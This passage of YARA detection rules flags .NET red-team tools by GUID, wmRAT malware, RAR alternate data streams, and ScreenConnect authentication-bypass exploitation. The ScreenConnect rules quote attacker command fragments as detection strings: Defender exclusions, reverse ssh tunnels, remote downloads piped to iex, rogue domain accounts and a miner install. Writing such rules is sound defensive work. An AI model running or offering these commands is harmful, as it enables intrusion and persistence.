		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/san3ncrypt3d/AESShellCodeInjector"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4792-L4805"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "38858c4e5f13eea32d47178a9221a35be92c9fbb408a542a712ce9b708591e42"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "b016da9e-12a1-4f1d-91a1-d681ae54e92c" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpchromium : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5364956a-e199-556a-8055-0e7b9a7b14c8"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/djhohnstein/SharpChromium"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4807-L4820"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f675d60987e5791550dff9cccc00109a2e30971de12c7f4c77288cf34122f7f2"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "2133c634-4139-466e-8983-9a23ec99e01b" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Get_RBCD_Threaded : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "fdef6dc3-da1a-5a98-a822-94e443981fdd"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/FatRodzianko/Get-RBCD-Threaded"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4822-L4835"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "a3cb7097f5fd5a2e5eac5ace774ea4e7f845989ee953f5aa140b0e05f3d04380"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "e20dc2ed-6455-4101-9d78-fccac1cb7a18" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Whisker : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "ecb0c59f-2111-58d9-8dc9-dfe005cad3be"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/eladshamir/Whisker"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4837-L4850"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "2d0e0436f83b5e4c4e2e7ef7237d5769a901f35b0462d5396bb5e398a72176dd"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "42750ac0-1bff-4f25-8c9d-9af144403bad" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Shadowspray : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "91dd52ef-07a1-5ffd-b5c3-59bca18d4c7c"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/Dec0ne/ShadowSpray"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4852-L4865"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "d45c8c20a782dbcb80db5c990ce02f6227e40a8b6d9875b1158735c5a53d4771"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "7e47d586-ddc6-4382-848c-5cf0798084e1" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Malsccm : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "4a88532b-e2bc-5ce9-828d-6ef62d91f6b9"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/nettitude/MalSCCM"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4867-L4880"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "064835e594c8e28903e5e18aa63c8bda53e74ddb3b8eda813ac62c7677b4e3fc"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "5439cecd-3bb3-4807-b33f-e4c299b71ca2" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Spoolsample : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "38346575-cf5b-59bf-b2b2-21aacf05b8a4"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/leechristensen/SpoolSample"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4882-L4895"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "8633b34f478b3d581f9403909d2ee20e7049d3ea02ecaf4fcb5dd61909681ba4"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "640c36b4-f417-4d85-b031-83a9d23c140b" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpoxidresolver : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "e8a957bc-3319-51c2-8289-01bd0b8a632a"
		date = "2023-03-22"
		modified = "2025-08-15"
		reference = "https://github.com/S3cur3Th1sSh1t/SharpOxidResolver"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4897-L4910"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "168d2d817fecdb9a457af26668f6e543556901151b025d322a4cfd63106cafed"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "ce59f8ff-0ecf-41e9-a1fd-1776ca0b703d" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpcat : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "450d13c6-93ae-5bf5-bdde-d874ab6c0cd5"
		date = "2023-11-30"
		modified = "2026-10-29"
		reference = "https://github.com/theart42/Sharpcat"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4912-L4924"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "143757610d66c5d7bbba96ef810d518f38ad8ea0e924be23aa59e8c514154fe0"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0 = "d16fd95f-23ce-4f8d-8763-b9f5a9cdd0c3" ascii nocase wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpnamedpipepth : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "561b95a5-f32b-5fe8-9e67-3f702306be93"
		date = "2023-11-30"
		modified = "2026-10-29"
		reference = "https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4926-L4938"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "437a8a41073174e86f642717537bdeeb5343cc8683c95477a52d6801a46aac21"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0 = "344ee55a-4e32-46f2-a003-69ad52b55945" ascii nocase wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharptokenfinder : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "60fd06be-041b-5fa8-8f25-41b26605ea90"
		date = "2023-12-06"
		modified = "2026-10-29"
		reference = "https://github.com/HuskyHacks/SharpTokenFinder"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4940-L4952"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f9681a13b094b6e05cab69f0684d52e3bb3b465cfcdb1c83a890c9c8fda79169"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0 = "572804d3-dbd6-450a-be64-2e3cb54fd173" ascii nocase wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharprodc : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "60779e7a-048f-5095-b853-fd90c4f7449e"
		date = "2023-12-06"
		modified = "2026-10-29"
		reference = "https://github.com/wh0amitz/SharpRODC"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4954-L4966"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3d24237804509d2bf241f7310843591608a9d7e8abb38eb324aa5909995ebfaf"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0 = "d305f8a3-019a-4cdf-909c-069d5b483613" ascii nocase wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Gmsapasswordreader : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "dc74bfce-90a1-53bd-bfe4-cb7c9c75da53"
		date = "2023-12-06"
		modified = "2026-10-29"
		reference = "https://github.com/rvazarkar/GMSAPasswordReader"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4968-L4980"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "8db260b15b8b8158e5f66268b9086b456386af017e4351025ea27b9f994e5bf5"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0 = "c8112750-972d-4efa-a75b-da9b8a4533c7" ascii nocase wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpsharefinder : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "bb485347-ea9b-5f26-99ad-bedc38bfecd5"
		date = "2023-12-19"
		modified = "2026-10-29"
		reference = "https://github.com/mvelazc0/SharpShareFinder"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4982-L4994"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "72b2c6c9f4da68ba8e9656ff2d9da962f9d791f031c1d7fb74d74ddd17ba49de"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0 = "64bfeb18-b65c-4a83-bde0-b54363b09b71" ascii nocase wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Postdump : FILE
{
	meta:
		description = "Detects .NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "7f33e76c-0227-5c23-b821-c5c9753e2384"
		date = "2023-12-19"
		modified = "2026-10-29"
		reference = "https://github.com/YOLOP0wn/POSTDump"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L4997-L5009"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e5bbef2fe7122855d7e5300ebf78631149e60b08793a4a21a4ac8b337f4bee60"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0 = "e54195f0-060c-4b24-98f2-ad9fb5351045" ascii nocase wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_APT_IN_TA397_Wmrat : HUNTING
{
	meta:
		description = "track wmRAT based on socket usage, odd error handling, and reused strings"
		author = "Proofpoint"
		id = "c5855b30-3e75-570f-b327-498dfc382159"
		date = "2024-11-20"
		modified = "2025-01-17"
		reference = "https://www.proofpoint.com/us/blog/threat-insight/hidden-plain-sight-ta397s-new-attack-chain-delivers-espionage-rats"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_ta397_dec24.yar#L2-L80"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3bf4bbd5564f4381820fb8da5810bd4d9718b5c80a7e8f055961007c6f30da2b"
		hash = "3e9a08972b8ec9c2e64eeb46ce1db92ae3c40bc8de48d278ba4d436fc3c8b3a4"
		hash = "40ddb4463be9d8131f363fd78e21d9de5d838a3ec4044526aea45a473d6ddd61"
		hash = "4836cb7eed0b20da50acb26472f918b180917101c026ce36074e0e879b604308"
		hash = "4e3e4d476810c95c34b6f2aa9c735f8e57e85e3b7a97c709adc5d6ee4a5f6ccc"
		hash = "5ab76cf85ade810b7ae449e3dff8a19a018174ced45d37062c86568d9b7633f9"
		hash = "811741d9df51a9f16272a64ec7eb8ff12f8f26794368b1ff4ad5d30a1f4bb42a"
		hash = "b588a423b826b57dce72c9ab58f89be2ddc710a0367ed0eed001c047d8bef32a"
		hash = "caf871247b7256945598816e9c5461d64b6bdb68a15ff9f8742ca31dc00865f8"
		logic_hash = "b20a13b87f4b81e7ebc10ff2f6203aeab46980e0d481bad786695339dd59bf7a"
		score = 75
		quality = 85
		tags = "HUNTING"
		category = "hunting"
		malfamily = "wmRAT"
		version = "1.0"

	strings:
		$code_sleep_loop = {
            6a 64              // push    0x64
            ff d6              // call    esi
            6a 01              // push    0x1
            e8 ?? ?? ?? ??     // call    operator new
            83 c4 04           // add     esp, 0x4
            3b c7              // cmp     eax, edi

        }
		$code_error_handling = {
            88 19           // mov     byte [ecx], bl
            4a              // dec     edx
            41              // inc     ecx
            47              // inc     edi
            4e              // dec     esi
            85 d2           // test    edx, edx
            ?? ??           // jne     0x401070
            5f              // pop     edi {__saved_edi}
            49              // dec     ecx
            5e              // pop     esi {__saved_esi}
            b8 7a 00 07 80  // mov     eax, 0x8007007a

        }
		$code_socket_recv_parsing = {
            // 8b 15 20 55 41 00   mov     edx, dword [data_415520]
            6a 00              // push    0x0
            b8 04 00 00 00     // mov     eax, 0x4
            2b c6              // sub     eax, esi
            50                 // push    eax {var_10_1}
            8d 0c 3e           // lea     ecx, [esi+edi]
            51                 // push    ecx {var_14_1}
            52                 // push    edx {var_18_1}
            ff ??              // call    ebx
            83 f8 ff           // cmp     eax, 0xffffffff
            ?? ??              // je      0x4082e3
            03 f0              // add     esi, eax
            83 fe 04           // cmp     esi, 0x4
          }
		$str1 = "-.-.-." ascii
		$str2 = "PATH" ascii
		$str3 = "Path=" ascii
		$str4 = "https://microsoft.com" ascii
		$str5 = "%s%ld M" ascii
		$str6 = "%s%ld K" ascii
		$str7 = "%s(%ld)" ascii
		$str8 = "RFOX" ascii
		$str9 = "1llll" ascii
		$str10 = "%d result(s)" ascii
		$str11 = "%s%ld MB" ascii
		$str12 = "%s%ld KB" ascii
		$str13 = "%.1f" ascii
		$str14 = "%02d-%02d-%d %02d:%02d" ascii

	condition:
		uint16be( 0x0 ) == 0x4d5a and ( 2 of ( $code* ) or 10 of ( $str* ) )
}
rule SIGNATURE_BASE_SUSP_RAR_NTFS_ADS : HUNTING FILE
{
	meta:
		description = "Detects RAR archive with NTFS alternate data stream"
		author = "Proofpoint"
		id = "ca2b5904-b3d3-53cd-a973-6f30f0831a94"
		date = "2024-12-17"
		modified = "2025-01-17"
		reference = "https://www.proofpoint.com/us/blog/threat-insight/hidden-plain-sight-ta397s-new-attack-chain-delivers-espionage-rats"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_ta397_dec24.yar#L82-L110"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "feec47858379c29300d249d1693f68dc085300f493891d1a9d4ea83b8db6e3c3"
		hash = "53a653aae9678075276bdb8ccf5eaff947f9121f73b8dcf24858c0447922d0b1"
		logic_hash = "bcca4771e8f940ce8cfcff08284545fec6163df549e1fb589d89ca3fa335f04c"
		score = 70
		quality = 83
		tags = "HUNTING, FILE"
		category = "hunting"

	strings:
		$rar_magic = {52 61 72 21}
		$ads = {
                 03         // Header Type -> Service Header
                 23         // Header flags
                 [17-20]    // Flags and extra data area
                 00         // Windows
                 03         // Length of name = STM = 3
                 53 54 4d   // STM NTFS alternate data stream
                 [1-2]      // variable int (vint) for size of the stream name -> 1-2 bytes should be enough to take into account
                 07         // Data type = Service data = Service header data array
                 3a         // Start of the ADS name -> start with colon ":"
               }
		$neg = "Zone.Identifier"

	condition:
		$rar_magic at 0 and $ads and not $neg in ( @ads [ 1 ] .. @ads [ 1 ] + 15 )
}
rule SIGNATURE_BASE_Connectwise_Screenconnect_Authentication_Bypass_Feb_2024_Exploitation_IIS_Logs
{
	meta:
		description = "Detects an http request to '/SetupWizard.aspx/' with anything following it, which when found in IIS logs is a potential indicator of compromise of the 2024 ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass"
		author = "Huntress DE&TH Team (modified by Florian Roth)"
		id = "2886530b-e164-4c4b-b01e-950e3c40acb4"
		date = "2024-02-20"
		modified = "2024-02-21"
		reference = "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L3-L18"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f6c7a3aa2ed98e754f9523c55eb035c7bc5f8aea96a6f86c729e9658d78710fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " GET /SetupWizard.aspx/" ascii
		$s2 = " POST /SetupWizard.aspx/" ascii
		$s3 = " PUT /SetupWizard.aspx/" ascii
		$s4 = " HEAD /SetupWizard.aspx/" ascii

	condition:
		1 of them
}
rule SIGNATURE_BASE_SUSP_Screenconnect_User_Poc_Com_Unused_Feb24 : FILE
{
	meta:
		description = "Detects suspicious ScreenConnect user with poc.com email address, which is a sign of exploitation of the ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability with the POC released by WatchTower and the account wasn't actually used yet to login"
		author = "Florian Roth"
		id = "c57e6c6a-298f-5ff3-b76a-03127ff88699"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc/blob/45e5b2f699a4d8f2d59ec3fc79a2e3c99db71882/watchtowr-vs-ConnectWise_2024-02-21.py#L53"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L20-L38"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "2433ad11ca1d9f970eb3c536a13f07e808c2a0b8b0dd625dffbe4947268ab8f5"
		score = 65
		quality = 85
		tags = "FILE"

	strings:
		$a1 = "<Users xmlns:xsi="
		$a2 = "<CreationDate>"
		$s1 = "@poc.com</Email>"
		$s2 = "<LastLoginDate>0001"

	condition:
		filesize < 200KB and all of ( $a* ) and all of ( $s* )
}
rule SIGNATURE_BASE_SUSP_Screenconnect_User_Poc_Com_Used_Feb24 : FILE
{
	meta:
		description = "Detects suspicious ScreenConnect user with poc.com email address, which is a sign of exploitation of the ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability with the POC released by WatchTower and the account was already used yet to login"
		author = "Florian Roth"
		id = "91990558-f145-5968-9722-b6815f6ad8d5"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://github.com/watchtowrlabs/connectwise-screenconnect_auth-bypass-add-user-poc/blob/45e5b2f699a4d8f2d59ec3fc79a2e3c99db71882/watchtowr-vs-ConnectWise_2024-02-21.py#L53"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L40-L60"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "50967a07a9789f20ccbc882c3b9e3142f0c28068c0a58b9d8927d725d02bf289"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$a1 = "<Users xmlns:xsi="
		$a2 = "<CreationDate>"
		$s1 = "@poc.com</Email>"
		$f1 = "<LastLoginDate>0001"

	condition:
		filesize < 200KB and all of ( $a* ) and $s1 and not 1 of ( $f* )
}
rule SIGNATURE_BASE_SUSP_Screenconnect_Exploitation_Artefacts_Feb24 : SCRIPT
{
	meta:
		description = "Detects post exploitation indicators observed by HuntressLabs in relation to the ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass"
		author = "Florian Roth"
		id = "079f4153-8bc7-574f-b6fa-af5536b842ab"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L62-L103"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "6f0d5f878847da1afb0d7b83e84bd337cfa67c36da2cbb33af712ed4ffad490a"
		score = 75
		quality = 83
		tags = "SCRIPT"

	strings:
		$x01 = "-c foreach ($disk in Get-WmiObject Win32_Logicaldisk){Add-MpPreference -ExclusionPath $disk.deviceid}"
		$x02 = ".msi c:\\mpyutd.msi"
		$x03 = "/MyUserName_$env:UserName"
		$x04 = " -OutFile C:\\Windows\\Help\\"
		$x05 = "/Create /TN \\\\Microsoft\\\\Windows\\\\Wininet\\\\UserCache_"
		$x06 = "$e = $r + \"ssh.exe\""
		$x07 = "Start-Process -f $e -a $args -PassThru -WindowStyle Hidden).Id"
		$x08 = "-R 9595:localhost:3389 -p 443 -N -oStrictHostKeyChecking=no "
		$x09 = "chromeremotedesktophost.msi', $env:ProgramData+"
		$x10 = "9595; iwr -UseBasicParsing "
		$x11 = "curl  https://cmctt.]com/pub/media/wysiwyg/"
		$x12 = ":8080/servicetest2.dll"
		$x13 = "/msappdata.msi c:\\mpyutd.msi"
		$x14 = "/svchost.exe -OutFile "
		$x15 = "curl http://minish.wiki.gd"
		$x16 = " -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile "
		$x17 = "rundll32.exe' -Headers @"
		$x18 = "/nssm.exe' -Headers @"
		$x19 = "c:\\programdata\\update.dat UpdateSystem"
		$x20 = "::size -eq 4){\\\"TVqQAA" ascii wide
		$x21 = "::size -eq 4){\"TVqQAA" ascii wide
		$x22 = "-nop -c [System.Reflection.Assembly]::Load(([WmiClass]'root\\cimv2:System_"
		$xp0 = "/add default test@2021! /domain"
		$xp1 = "/add default1 test@2021! /domain"
		$xp2 = "oldadmin Pass8080!!"
		$xp3 = "temp 123123qwE /add "
		$xp4 = "oldadmin \"Pass8080!!\""
		$xp5 = "nssm set xmrig AppDirectory "

	condition:
		1 of ( $x* )
}
rule SIGNATURE_BASE_SUSP_Command_Line_Combos_Feb24_2 : SCRIPT FILE
{
	meta:
		description = "Detects suspicious command line combinations often found in post exploitation activities"
		author = "Florian Roth"
		id = "d9bc6083-c3ca-5639-a9df-483fea6d0187"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L105-L118"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "0cd7b4771aa8fd622e873c5cdc6689d24394e5faf026b36d5f228ac09f4e0441"
		score = 75
		quality = 85
		tags = "SCRIPT, FILE"

	strings:
		$sa1 = " | iex"
		$sa2 = "iwr -UseBasicParsing "

	condition:
		filesize < 2MB and all of them
}
rule SIGNATURE_BASE_SUSP_PS1_Combo_Transfersh_Feb24 : SCRIPT
{
	meta:
		description = "Detects suspicious PowerShell command that downloads content from transfer.sh as often found in loaders"
		author = "Florian Roth"
		id = "fd14cca5-9cf8-540b-9d6e-39ca2c267272"
		date = "2024-02-23"
		modified = "2024-04-24"
		reference = "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_connectwise_screenconnect_vuln_feb24.yar#L120-L135"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "64d4343ecdcbc4a28571557bec2f31c1ff73c2ecf63d0feaa0a71001bb9bf499"
		score = 70
		quality = 85
